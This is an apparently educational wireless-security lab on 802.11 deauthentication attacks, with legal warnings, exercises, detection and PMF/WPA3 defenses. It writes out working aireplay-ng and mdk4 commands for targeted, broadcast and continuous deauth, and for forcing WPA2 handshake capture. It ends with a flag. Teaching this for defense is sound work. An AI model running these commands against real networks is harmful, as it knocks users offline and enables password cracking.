# Lab 06: Deauthentication Attacks

Understanding deauthentication attacks, their impact on wireless networks, and defensive measures.

```
+===============================================================+
|                  DEAUTHENTICATION ATTACKS                      |
+===============================================================+
|  Difficulty: Intermediate    Duration: 1 hour                 |
|  Hardware: WiFi Adapter      Type: Practical                  |
+===============================================================+
```

## Legal Disclaimer

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  Deauthentication attacks are ILLEGAL in most jurisdictions,        |
|  even on public networks or with partial authorization.             |
|                                                                      |
|  These attacks:                                                      |
|  - Disrupt service for ALL users on a network                       |
|  - May violate the Computer Fraud and Abuse Act                     |
|  - Can interfere with emergency communications                      |
|  - May violate FCC regulations (intentional interference)           |
|                                                                      |
|  ONLY perform these attacks:                                        |
|  - On networks you COMPLETELY OWN                                   |
|  - In ISOLATED environments with NO other users affected           |
|  - With EXPLICIT WRITTEN authorization                              |
|                                                                      |
|  Penalties include fines up to $100,000 and imprisonment.           |
+=====================================================================+
```

## Learning Objectives

By the end of this lab, you will:

1. Understand how 802.11 deauthentication frames work
2. Know why deauth attacks are effective against WPA2
3. Use aireplay-ng for targeted and broadcast deauth
4. Understand the role of deauth in handshake capture
5. Learn about Protected Management Frames (PMF/802.11w)
6. Implement defensive measures against deauth attacks

## Prerequisites

- Completed Lab 03: Wireless Reconnaissance
- Completed Lab 05: WPA/WPA2 Attacks
- WiFi adapter with monitor mode and packet injection
- Isolated test network with your own devices

## Hardware Requirements

| Component | Requirement | Notes |
|-----------|-------------|-------|
| WiFi Adapter | Monitor + Injection | Alfa AWUS036ACH recommended |
| Test AP | WPA2-PSK | Your own router |
| Test Client | Any WiFi device | Your own device to deauth |

**Important:** Ensure no other users/devices depend on your test network.

## Theory: How Deauthentication Works

### 802.11 Management Frames

```
802.11 Frame Types:

┌──────────────────────────────────────────────────────────────────┐
│                    MANAGEMENT FRAMES                              │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Subtype 0x00 - Association Request                              │
│  Subtype 0x01 - Association Response                             │
│  Subtype 0x08 - Beacon                                           │
│  Subtype 0x0A - Disassociation                                   │
│  Subtype 0x0B - Authentication                                   │
│  Subtype 0x0C - Deauthentication  ◄── EXPLOITED IN THIS ATTACK  │
│                                                                   │
│  CRITICAL FLAW: Management frames are NOT authenticated          │
│                 in WPA2 without PMF (802.11w)                    │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

### The Deauthentication Frame

```
Deauthentication Frame Structure:

┌────────────────────────────────────────────────────────────────┐
│                  802.11 DEAUTH FRAME                            │
├────────────────────────────────────────────────────────────────┤
│  Frame Control    : 0x00C0 (Type=0, Subtype=12)                │
│  Duration         : 0x013A                                      │
│  Destination      : FF:FF:FF:FF:FF:FF (broadcast) or           │
│                     [Specific client MAC]                       │
│  Source           : [AP MAC or spoofed]                        │
│  BSSID            : [AP MAC]                                   │
│  Sequence Control : 0x0000                                      │
│  Reason Code      : 0x0007 (Class 3 frame from non-assoc STA)  │
│  FCS              : [Checksum]                                  │
└────────────────────────────────────────────────────────────────┘

Reason Codes:
  1 - Unspecified reason
  2 - Previous authentication no longer valid
  3 - Station leaving (or has left) BSS
  4 - Disassociated due to inactivity
  5 - AP unable to handle all associated stations
  6 - Class 2 frame received from nonauthenticated station
  7 - Class 3 frame received from nonassociated station
  8 - Station leaving BSS (or has left)
```

### Why Deauth Attacks Work

```
The Vulnerability:

┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│   CLIENT                         ATTACKER                   AP  │
│      │                              │                        │  │
│      │                              │                        │  │
│      │ ◄────────────────────────────│                        │  │
│      │    Spoofed Deauth Frame      │                        │  │
│      │    (appears to be from AP)   │                        │  │
│      │                              │                        │  │
│      │──── Disconnect ────────────────────────────────────► │  │
│      │                              │                        │  │
│      │                              │                        │  │
│      │ ◄──── Try to Reconnect ─────────────────────────────│  │
│      │           (4-way handshake captured by attacker)     │  │
│      │                              │                        │  │
│                                                                  │
│   The client cannot verify if deauth came from legitimate AP!   │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

## Attack Types

### Type 1: Targeted Deauthentication

```
Targeted Attack (Single Client):

   ATTACKER
       │
       │    Deauth (to specific client)
       └──────────────────────────────────► CLIENT
                                               ↓
                                          Disconnects
                                               ↓
       ◄────────────────────────────────── Reconnects
       │         (Handshake captured)

Characteristics:
- Less disruptive (only one client affected)
- Requires knowing target client MAC
- More stealthy
```

### Type 2: Broadcast Deauthentication

```
Broadcast Attack (All Clients):

   ATTACKER
       │
       │    Deauth (to broadcast FF:FF:FF:FF:FF:FF)
       │
       ├──────────────────────────────────► CLIENT 1
       │                                       ↓
       ├──────────────────────────────────► CLIENT 2
       │                                       ↓
       ├──────────────────────────────────► CLIENT 3
       │                                       ↓
       └──────────────────────────────────► CLIENT N
                                               ↓
                                         All Disconnect!

Characteristics:
- Very disruptive (all clients affected)
- Easier (no need to know client MACs)
- More likely to be detected
```

### Type 3: Continuous Deauthentication (DoS)

```
Denial of Service Attack:

   ATTACKER                                    CLIENT
       │                                          │
       │────── Deauth ──────────────────────────►│ Disconnect
       │────── Deauth ──────────────────────────►│ Disconnect
       │────── Deauth ──────────────────────────►│ Disconnect
       │────── Deauth ──────────────────────────►│ Disconnect
       │              (Continuous)                │
       │                                          │
       └── Client cannot maintain connection ─────┘

Characteristics:
- Complete denial of service
- Highly disruptive and illegal
- Easy to detect with monitoring
```

## Step-by-Step Instructions

### Step 1: Environment Setup

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify injection works
sudo aireplay-ng --test wlan0mon

# Expected output:
# Injection is working!
```

### Step 2: Identify Target Network and Clients

```bash
# Scan networks
sudo airodump-ng wlan0mon

# Note your test AP's:
# - BSSID (AP MAC)
# - Channel
# - Connected clients (STATION column)
```

### Step 3: Targeted Deauthentication

```bash
# Deauth specific client from your test network
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Parameters:
# -0 5     : Send 5 deauthentication packets
# -a       : Target AP BSSID
# -c       : Target client MAC
# wlan0mon : Monitor interface

# Output:
# Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [60|64 ACKs]
# Sending 64 directed DeAuth (code 7). STMAC: [11:22:33:44:55:66] [63|65 ACKs]
# ...
```

### Step 4: Broadcast Deauthentication

```bash
# Deauth all clients from your test AP
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Without -c flag, sends broadcast deauth
# All clients on the AP will be disconnected
```

### Step 5: Continuous Deauthentication (Use Sparingly)

```bash
# Continuous deauth (0 = unlimited)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Press Ctrl+C to stop
# WARNING: This creates a DoS condition
```

### Step 6: Using mdk4 (Advanced)

```bash
# Install mdk4
sudo apt install mdk4

# Deauth attack mode
sudo mdk4 wlan0mon d -c 6 -b blacklist.txt

# Parameters:
# d        : Deauth mode
# -c 6     : Channel 6
# -b       : Blacklist file (BSSIDs to attack)

# Create blacklist.txt:
echo "AA:BB:CC:DD:EE:FF" > blacklist.txt
```

## Integration with Handshake Capture

```
Combined Attack for WPA2 Cracking:

Terminal 1: Capture                    Terminal 2: Deauth
────────────────────────              ────────────────────
$ sudo airodump-ng -c 6 \             $ sudo aireplay-ng -0 5 \
  --bssid AA:BB:CC:DD:EE:FF \           -a AA:BB:CC:DD:EE:FF \
  -w capture wlan0mon                   -c 11:22:33:44:55:66 \
                                        wlan0mon
    │                                         │
    │   ◄─────────── Deauth sent ────────────┘
    │
    ▼
  [WPA handshake: AA:BB:CC:DD:EE:FF]

  Handshake captured when client reconnects!
```

## Defensive Measures

### Defense 1: Protected Management Frames (PMF/802.11w)

```
802.11w (PMF) Protection:

┌──────────────────────────────────────────────────────────────────┐
│                    HOW PMF WORKS                                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  WITHOUT PMF:                                                     │
│  ┌──────────┐                      ┌──────────┐                  │
│  │  Client  │ ◄──── Deauth ─────── │ Attacker │                  │
│  └──────────┘      (Accepted)      └──────────┘                  │
│                                                                   │
│  WITH PMF:                                                        │
│  ┌──────────┐                      ┌──────────┐                  │
│  │  Client  │ ◄──── Deauth ─────── │ Attacker │                  │
│  └──────────┘      (REJECTED -     └──────────┘                  │
│                    Invalid MIC!)                                  │
│                                                                   │
│  PMF adds Message Integrity Code to management frames            │
│  Only the legitimate AP can create valid deauth frames           │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```

**Enable PMF on Router:**
1. Access router admin interface
2. Navigate to Wireless Security settings
3. Look for "Protected Management Frames" or "802.11w"
4. Set to "Required" if all clients support it
5. Set to "Capable" for backward compatibility

### Defense 2: WPA3

```
WPA3 Includes Mandatory PMF:

┌─────────────────────────────────────────────────────────────────┐
│                    WPA3 IMPROVEMENTS                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  WPA3-Personal:                                                  │
│  ├── SAE (Dragonfly) key exchange                               │
│  ├── Forward secrecy                                            │
│  └── MANDATORY Protected Management Frames                      │
│                                                                  │
│  Deauth attacks are much harder against WPA3 networks!          │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Defense 3: Wireless IDS/IPS

```bash
# Deploy wireless intrusion detection
# Examples: Kismet, Snort wireless, Aruba WIPS

# Kismet can detect deauth floods
sudo kismet -c wlan0mon

# Look for alerts like:
# "DEAUTHFLOOD detected against [BSSID]"
```

### Defense 4: Client-Side Protection

```
Client Configuration:

1. Enable PMF on client devices:
   - Windows: Group Policy → Wireless settings → PMF
   - macOS: Typically automatic with WPA3
   - Linux: wpa_supplicant.conf → ieee80211w=1

2. Use Ethernet for critical connections

3. VPN over WiFi (doesn't prevent deauth but protects data)
```

## Lab Exercises

### Exercise 1: Basic Deauthentication

1. Set up your isolated test network
2. Connect your test device to the network
3. Perform targeted deauth against your device
4. Observe disconnection and reconnection behavior

### Exercise 2: Handshake Capture with Deauth

1. Start capture on your test network
2. Use deauth to force handshake capture
3. Compare time vs. passive capture
4. Verify handshake quality

### Exercise 3: PMF Testing

1. Enable PMF on your test router (if supported)
2. Connect PMF-capable client
3. Attempt deauth attack
4. Verify client remains connected

### Exercise 4: Detect Deauth Attacks

1. Start Kismet or similar IDS
2. Perform deauth attack (from another device)
3. Observe detection alerts
4. Analyze attack characteristics

## Common Attack Scenarios

### Scenario 1: Evil Twin Preparation

```
Attacker Goal: Force clients to connect to fake AP

1. Attacker creates evil twin (same SSID as target)
2. Continuous deauth against legitimate AP
3. Clients fail to connect to real AP
4. Some clients connect to evil twin
5. Attacker captures credentials
```

### Scenario 2: WPA Handshake Capture

```
Attacker Goal: Obtain handshake for offline cracking

1. Monitor target network
2. Wait for client or send deauth
3. Capture 4-way handshake on reconnect
4. Offline dictionary attack
```

### Scenario 3: Denial of Service

```
Attacker Goal: Disrupt network availability

1. Continuous broadcast deauth
2. All clients unable to maintain connection
3. Network becomes unusable
```

## Detection and Monitoring

### Detecting Deauth Attacks with Wireshark

```bash
# Capture wireless traffic
sudo wireshark -i wlan0mon

# Filter for deauth frames:
wlan.fc.type_subtype == 0x0c

# High count of deauth frames = attack in progress
```

### Detecting with Airodump-ng

```bash
# Watch for rapid authentication failures
sudo airodump-ng wlan0mon

# Signs of attack:
# - Clients appearing and disappearing rapidly
# - High "Lost" packet count
# - Client showing "(not associated)" repeatedly
```

## Knowledge Check

1. Why are deauthentication attacks effective against WPA2?
2. What is the difference between targeted and broadcast deauth?
3. How does 802.11w (PMF) protect against deauth attacks?
4. What reason code is commonly used in deauth attacks?
5. Why is WPA3 more resistant to deauth attacks?

<details>
<summary>Answers</summary>

1. Management frames (including deauth) are not authenticated in WPA2 without PMF - clients cannot verify if deauth came from legitimate AP
2. Targeted deauth affects only one specific client (requires knowing MAC), broadcast deauth affects all clients on the network
3. PMF adds a Message Integrity Code (MIC) to management frames, so only the legitimate AP can send valid deauth frames
4. Reason code 7 (Class 3 frame received from nonassociated station) is commonly used
5. WPA3 mandates Protected Management Frames (PMF), making deauth frame spoofing ineffective

</details>

## Summary

In this lab, you learned:

1. **Deauth Frame Structure**: How 802.11 deauth frames work
2. **Attack Types**: Targeted, broadcast, and continuous deauth
3. **Tools**: aireplay-ng and mdk4 for deauth attacks
4. **Integration**: Using deauth for handshake capture
5. **Defenses**: PMF, WPA3, and wireless IDS
6. **Detection**: Identifying deauth attacks with monitoring tools

## Ethical Considerations

```
╔══════════════════════════════════════════════════════════════════╗
║                    RESPONSIBLE USE                                ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  Deauth attacks can have serious consequences:                    ║
║                                                                   ║
║  • Medical devices may lose connectivity                         ║
║  • Security cameras could go offline                             ║
║  • VoIP calls will be dropped                                    ║
║  • Emergency services could be affected                          ║
║                                                                   ║
║  ALWAYS ensure:                                                   ║
║  • Complete isolation of test environment                        ║
║  • No innocent parties affected                                  ║
║  • Full authorization documented                                 ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
```

## Next Lab

Proceed to [Lab 07: Evil Twin Attacks](../07-evil-twin-attacks/) to learn about rogue access point attacks.

## References

- [802.11 Deauthentication Frame](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack)
- [802.11w Protected Management Frames](https://www.wi-fi.org/discover-wi-fi/security)
- [Aircrack-ng Aireplay Documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)

---

**Flag:** `FLAG{d34uth_4tt4ck}`
